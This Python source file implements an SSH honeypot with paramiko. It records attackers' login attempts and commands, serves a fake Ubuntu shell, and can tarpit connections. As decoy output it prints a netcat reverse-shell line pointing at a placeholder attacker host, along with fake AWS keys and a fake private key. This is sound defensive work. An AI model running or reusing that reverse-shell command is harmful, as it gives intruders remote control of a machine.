# Import library dependencies.
import logging
from logging.handlers import RotatingFileHandler
import paramiko
import threading
import socket
import time
from pathlib import Path
from dotenv import load_dotenv
import os

# Load .env
load_dotenv()
HONEYPY_HOST = os.getenv("HONEYPY_HOST", "0.0.0.0")

# Constants.
SSH_BANNER = "SSH-2.0-MySSHServer_1.0"

# Get base directory of where user is running honeypy from.
base_dir = Path(__file__).parent.parent

# Source creds_audits.log & cmd_audits.log file path.
server_key = base_dir / 'ssh_honeypy' / 'static' / 'server.key'

creds_audits_log_local_file_path = base_dir / 'ssh_honeypy' / 'log_files' / 'creds_audits.log'
cmd_audits_log_local_file_path = base_dir / 'ssh_honeypy' / 'log_files' / 'cmd_audits.log'

# SSH Server Host Key.
host_key = paramiko.RSAKey(filename=server_key)

# Logging Format.
logging_format = logging.Formatter('%(message)s')

# Funnel (catch all) Logger.
funnel_logger = logging.getLogger('FunnelLogger')
funnel_logger.setLevel(logging.INFO)
funnel_handler = RotatingFileHandler(cmd_audits_log_local_file_path, maxBytes=2000, backupCount=5)
funnel_handler.setFormatter(logging_format)
funnel_logger.addHandler(funnel_handler)

# Credentials Logger. Captures IP Address, Username, Password.
creds_logger = logging.getLogger('CredsLogger')
creds_logger.setLevel(logging.INFO)
creds_handler = RotatingFileHandler(creds_audits_log_local_file_path, maxBytes=2000, backupCount=5)
creds_handler.setFormatter(logging_format)
creds_logger.addHandler(creds_handler)


# SSH Server Class. This establishes the options for the SSH server.
class Server(paramiko.ServerInterface):

    def __init__(self, client_ip, input_username=None, input_password=None):
        self.event = threading.Event()
        self.client_ip = client_ip
        self.input_username = input_username
        self.input_password = input_password

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED

    def get_allowed_auths(self, username):
        return "password"

    def check_auth_password(self, username, password):
        funnel_logger.info(f'Client {self.client_ip} attempted connection with username: {username}, password: {password}')
        creds_logger.info(f'{self.client_ip}, {username}, {password}')
        if self.input_username is not None and self.input_password is not None:
            if username == self.input_username and password == self.input_password:
                return paramiko.AUTH_SUCCESSFUL
            else:
                return paramiko.AUTH_FAILED
        else:
            return paramiko.AUTH_SUCCESSFUL

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

    def check_channel_exec_request(self, channel, command):
        command = str(command)
        return True


def emulated_shell(channel, client_ip):
    PROMPT = b"ubuntu@vps-01:~$ "
    channel.send(PROMPT)
    command = b""
    while True:
        char = channel.recv(1)
        channel.send(char)
        if not char:
            channel.close()

        command += char

        if char == b"\r":
            cmd = command.strip()

            if cmd == b'exit':
                response = b"\n Goodbye!\n"
                channel.send(response)
                channel.close()

            elif cmd == b'pwd':
                response = b"\n/home/ubuntu\r\n"

            elif cmd == b'whoami':
                response = b"\nubuntu\r\n"

            elif cmd == b'id':
                response = b"\nuid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)\r\n"

            elif cmd == b'uname -a':
                response = b"\nLinux vps-01 5.15.0-100-generic #109-Ubuntu SMP x86_64 GNU/Linux\r\n"

            elif cmd == b'ls':
                response = b"\ndocuments  downloads  honeypot.log  script.sh  config.yml  id_rsa\r\n"

            elif cmd == b'cat honeypot.log':
                response = b"\nNothing to see here!\r\n"

            elif cmd == b'cat config.yml':
                response = b"\nAWS_ACCESS_KEY_ID: AKIAEXAMPLE\nAWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\r\n"

            elif cmd == b'cat script.sh':
                response = b"\n#!/bin/bash\n# Startup backdoor\nnc -e /bin/bash attacker_ip 4444\n\r\n"

            elif cmd == b'cat id_rsa':
                response = b"\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA1EXAMPLEFAKEKEYwIDAQAB\n-----END RSA PRIVATE KEY-----\r\n"

            elif cmd == b'cat /etc/passwd':
                response = b"\nroot:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n\r\n"

            elif cmd == b'crontab -l':
                response = b"\n* * * * * /home/ubuntu/script.sh\n\r\n"

            elif cmd.startswith(b'wget ') or cmd.startswith(b'curl '):
                response = b"\nConnecting... Downloading malicious.sh ... Done!\r\n"

            elif cmd == b'sudo su':
                response = b"\n[sudo] password for ubuntu: \r\n"

            elif cmd == b'apt update':
                response = b"\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nAll packages are up to date.\r\n"

            elif cmd == b'ifconfig':
                response = b"\neth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\ninet 192.168.1.10  netmask 255.255.255.0  broadcast 192.168.1.255\n\r\n"

            else:
                response = b"\n" + cmd + b": command not found\r\n"

            funnel_logger.info(f'Command {cmd} executed by {client_ip}')
            channel.send(response)
            channel.send(PROMPT)
            command = b""


def client_handle(client, addr, username, password, tarpit=False):
    client_ip = addr[0]
    print(f"{client_ip} connected to server.")
    try:
        transport = paramiko.Transport(client)
        transport.local_version = SSH_BANNER

        server = Server(client_ip=client_ip, input_username=username, input_password=password)
        transport.add_server_key(host_key)
        transport.start_server(server=server)

        channel = transport.accept(100)

        if channel is None:
            print("No channel was opened.")

        standard_banner = "Welcome to Ubuntu 22.04 LTS (Jammy Jellyfish)!\r\n\r\n"

        try:
            if tarpit:
                endless_banner = standard_banner * 100
                for char in endless_banner:
                    channel.send(char)
                    time.sleep(8)
            else:
                channel.send(standard_banner)

            emulated_shell(channel, client_ip=client_ip)

        except Exception as error:
            print(error)
    except Exception as error:
        print(error)
        print("!!! Exception !!!")
    finally:
        try:
            transport.close()
        except Exception:
            pass

        client.close()


def honeypot(address, port, username, password, tarpit=False):
    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Utilise HONEYPY_HOST depuis .env au lieu de l'argument `address`
    socks.bind((HONEYPY_HOST, port))

    socks.listen(100)
    print(f"SSH server is listening on {HONEYPY_HOST}:{port}.")

    while True:
        try:
            client, addr = socks.accept()
            ssh_honeypot_thread = threading.Thread(target=client_handle, args=(client, addr, username, password, tarpit))
            ssh_honeypot_thread.start()

        except Exception as error:
            print("!!! Exception - Could not open new client connection !!!")
            print(error)
